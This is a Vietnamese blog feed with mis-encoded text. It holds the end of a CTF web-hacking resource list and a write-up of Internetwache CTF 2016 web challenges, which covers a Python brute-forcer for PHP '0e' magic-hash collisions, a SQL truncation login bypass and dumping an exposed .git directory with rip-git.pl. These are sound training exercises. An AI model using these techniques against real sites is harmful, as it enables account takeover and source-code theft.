&lt;ul&gt;
&lt;li&gt;&lt;a href="http://newdemy.com/courses/sql-injection-online-course-by-hitesh-choudhary"&gt;http://newdemy.com/courses/sql-injection-online-course-by-hitesh-choudhary&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="5localremotefileinclusion"&gt;5. Local &amp;amp; Remote File Inclusion&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Chi tiáº¿t: &lt;a href="http://hakipedia.com/index.php/Local_File_Inclusion"&gt;http://hakipedia.com/index.php/Local&lt;em&gt;File&lt;/em&gt;Inclusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Má»™t clip vÃ­ dá»¥: &lt;a href="https://www.youtube.com/watch?v=s3XQ1n5kdeQ"&gt;https://www.youtube.com/watch?v=s3XQ1n5kdeQ&lt;/a&gt;    &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="6xss"&gt;6. XSS&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Má»i thÃ´ng tin chi tiáº¿t xin truy cáº­p vÃ o link sau: &lt;a href="https://viblo.asia/Thanh/posts/73KbvZeLGmWB"&gt;KÄ© thuáº­t táº¥n cÃ´ng CROSS-SITE SCRIPTING&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="7luyntp"&gt;7. Luyá»‡n táº­p&lt;/h4&gt;

&lt;p&gt;Äá»c qua táº¥t cáº£ nhá»¯ng thÃ´ng tin phÃ­a trÃªn thÃ¬ Ä‘Ãºng lÃ  cÃ³ pháº§n hÆ¡i quÃ¡ táº£i. LÃºc Ä‘áº§u má»›i chÆ¡i CTF mÃ¬nh cÅ©ng khÃ´ng cÃ³ nhiá»u kiáº¿n thá»©c Ä‘áº¿n váº­y. BÃ i viáº¿t nÃ y mÃ¬nh muá»‘n lÃ  má»™t nÆ¡i tá»•ng há»£p tÆ°Æ¡ng Ä‘á»‘i cÃ¡c kiáº¿n thá»©c cáº§n thiáº¿t Ä‘á»ƒ cÃ¡c báº¡n biáº¿t sáº½ cáº§n trang bá»‹ nhá»¯ng gÃ¬, tÃ¬m váº¥n Ä‘á» á»Ÿ Ä‘Ã¢u,... Sau cÃ¹ng dÆ°á»›i Ä‘Ã¢y lÃ  nhá»¯ng nÆ¡i mÃ¬nh Ä‘Ã£ luyá»‡n táº­p CTF mÃ  tháº¥y ráº¥t hiá»‡u quáº£&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://hackthis.co.uk"&gt;http://hackthis.co.uk&lt;/a&gt; - Má»™t site phÃ¹ há»£p cho ngÆ°á»i má»›i báº¯t Ä‘áº§u.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.root-me.org/en/Challenges/Web-Server/"&gt;http://www.root-me.org/en/Challenges/Web-Server/&lt;/a&gt; - Má»™t list challenges bao quÃ¡t ráº¥t nhiá»u váº¥n Ä‘á», gá»“m cáº£ cÃ¡c bÃ i LFI/ RFI, cÃ¡c loáº¡i SQLi, cÃ¡c tÃ i liá»‡u hÆ°á»›ng dáº«n.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://overthewire.org/wargames/natas/"&gt;http://overthewire.org/wargames/natas/&lt;/a&gt; - Gá»“m cáº£ cÃ¡c dáº¡ng bÃ i vá» Command injection vÃ  PHP Objection Injection&lt;/li&gt;
&lt;li&gt;&lt;a href="http://webhacking.kr"&gt;http://webhacking.kr&lt;/a&gt; - CÃ³ khoáº£ng 60 challenges vá» web tá»« khÃ³ Ä‘áº¿n dá»…. Má»™t sá»‘ bÃ i hÆ¡i mang tÃ­nh thÃ¡ch Ä‘á»‘&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ringzer0team.com"&gt;http://ringzer0team.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Má»™t lÆ°u Ã½ cuá»‘i lÃ  cÃ¡c báº¡n hÃ£y káº¿t há»£p viá»‡c luyá»‡n táº­p á»Ÿ cÃ¡c site phÃ¡i trÃªn vÃ  viá»‡c tham gia cÃ¡c giáº£i ctf má»›i ra á»Ÿ &lt;a href="http://ctftime.org"&gt;http://ctftime.org&lt;/a&gt; ná»¯a :D. ChÃºc cÃ¡c báº¡n vui váº»!&lt;/p&gt;</content:encoded></item><item><title>[CTF] Write-up Internetwache CTF 2016 Web50,70,80</title><description>&lt;h3 id="web50"&gt;Web50&lt;/h3&gt;

&lt;p&gt;BÃ i nÃ y cho má»™t Ä‘oáº¡n code nhÆ° sau:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;&amp;lt;?php  
$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {  
    return preg_replace("/[^0-9a-f]/","",$hash);
}
function myhash($str) {  
    return clean_hash(md5(md5($str) . "SALT"));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NhÃ¬n qua thÃ¬ cÃ³ váº» Ä‘oáº¡n hash trÃªn lÃ  káº¿t quáº£&lt;/p&gt;</description><link>http://localhost:2368/ctf-write-up-internetwache-ctf-2016-web50-70-80/</link><guid isPermaLink="false">01d3072c-1be3-4a1d-a275-4c0f96b7f82d</guid><category>CTF</category><category>web</category><dc:creator>Do Anh</dc:creator><pubDate>Tue, 23 Feb 2016 17:38:00 GMT</pubDate><content:encoded>&lt;h3 id="web50"&gt;Web50&lt;/h3&gt;

&lt;p&gt;BÃ i nÃ y cho má»™t Ä‘oáº¡n code nhÆ° sau:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;&amp;lt;?php  
$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {  
    return preg_replace("/[^0-9a-f]/","",$hash);
}
function myhash($str) {  
    return clean_hash(md5(md5($str) . "SALT"));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NhÃ¬n qua thÃ¬ cÃ³ váº» Ä‘oáº¡n hash trÃªn lÃ  káº¿t quáº£ cá»§a 2 láº§n md5 kÃ¨m vá»›i má»™t chuá»—i "SALT". &lt;/p&gt;

&lt;p&gt;áº¦y, nhÆ°ng Ä‘á»ƒ Ã½ Ä‘oáº¡n hash khÃ¡ láº¡. Báº¯t Ä‘áº§u báº±ng &lt;code&gt;0e&lt;/code&gt; vÃ  theo sau Ä‘áº¥y chá»‰ toÃ n lÃ  sá»‘. CÃ³ khi nÃ o tÆ°Æ¡ng tá»± nhÆ° kiá»ƒu chuá»—i dáº¡ng hex &lt;code&gt;0x&lt;/code&gt; hoáº·c binary &lt;code&gt;0b&lt;/code&gt; trong sql? Sau khi google má»™t lÃºc thÃ¬ mÃ¬nh Ä‘Ã£ cÃ³ má»™t sá»‘ thÃ´ng tin thÃº vá»‹ tá»« cÃ¡i chuá»—i &lt;code&gt;0e&lt;/code&gt; nÃ y &lt;a href="http://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo"&gt;&lt;strong&gt;Why md5('240610708') is equal to md5('QNKCDZO')?&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;NhÆ° váº­y bÃ¢y giá» cáº§n bruteforce ra má»™t hash tá»« cÃ´ng thá»©c &lt;code&gt;md5(md5($password)."SALT")&lt;/code&gt; mÃ  cÃ³ kÃ½ tá»± Ä‘áº§u lÃ  &lt;code&gt;0e&lt;/code&gt; hoáº·c &lt;code&gt;00e&lt;/code&gt; , ... vÃ  theo sau toÃ n lÃ  sá»‘.&lt;/p&gt;

&lt;p&gt;Code python:  &lt;/p&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;import hashlib

datax = raw_input("Input: ")  
i = 0  
while True:  
    alpha = hashlib.md5()
    alpha.update(str(i))
    beta = hashlib.md5()
    beta.update(str(alpha.hexdigest())+"SALT")
    rs = beta.hexdigest()
    if rs[:2]=="0e" or rs[:3] == "00e":
        if rs[2:31].isdigit() or rs[3:31].isdigit():
            print "[+] FOUND:"+str(i) 
            raw_input("Press c to continue searching")
    if i % 1000 == 0:
        print "[+] Searching: "+str(i)+" | "+rs
    i = i + 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Káº¿t quáº£ in ra chÃ­nh lÃ  password ta cáº§n: &lt;code&gt;62778807&lt;/code&gt;&lt;/p&gt;

&lt;h3 id="web70"&gt;Web70&lt;/h3&gt;

&lt;p&gt;BÃ i nÃ y dÃ¹ng lá»—i sql truncation Ä‘á»ƒ táº¥n cÃ´ng. &lt;br&gt;
Register má»™t account vá»›i username &lt;code&gt;admin                     x&lt;/code&gt;, password báº¥t ká»³. Sau Ä‘Ã³ ta sáº½ login Ä‘Æ°á»£c thÃ nh cÃ´ng vÃ o account &lt;code&gt;admin&lt;/code&gt; vÃ¬ Ä‘oáº¡n phÃ­a sau cá»§a username vÆ°á»£t quÃ¡ sá»‘ kÃ½ tá»± trong database.&lt;/p&gt;

&lt;h3 id="web80"&gt;Web80&lt;/h3&gt;

&lt;p&gt;Má»™t site chá»‰ cÃ³ code HTML &gt; &lt;a href="https://github.com/internetwache/Internetwache-CTF-2016/blob/master/tasks/web80/code/index.html"&gt;Source&lt;/a&gt; &lt;br&gt;
Äá»ƒ Ã½ cÃ³ má»™t dÃ²ng lÃ :&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;It's 2016 now and I need to somehow keep track of my changes to this document as it grows and grows. All people are talking about a tool called '&lt;strong&gt;Git&lt;/strong&gt;'. I think I might give this a try.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Thá»­ truy cáº­p &lt;code&gt;https://0ldsk00lblog.ctf.internetwache.org/.git/HEAD&lt;/code&gt; thÃ nh cÃ´ng =&gt; Giá» pháº£i bÃª thÆ° má»¥c .git nÃ y vá» Ä‘á»ƒ kiá»ƒm tra xem cÃ³ gÃ¬&lt;/p&gt;

&lt;p&gt;MÃ¬nh dÃ¹ng má»™t tool cÃ³ sáºµn, code báº±ng perl &gt; &lt;a href="https://github.com/kost/dvcs-ripper/blob/master/rip-git.pl"&gt;rip-git.pl&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Cháº¡y tool vÃ  string &lt;code&gt;flag&lt;/code&gt; trong thÆ° má»¥c .git nÃ y  &lt;/p&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;$ PERL_LWP_SSL_VERIFY_HOSTNAME=0 ./rip-git.pl -v -u https://0ldsk00lblog.ctf.internetwache.org/.git
$ grep -r "flag" ./
flag IW{G1T_1S_4W3SOME}  
&lt;/code&gt;&lt;/pre&gt;</content:encoded></item></channel></rss>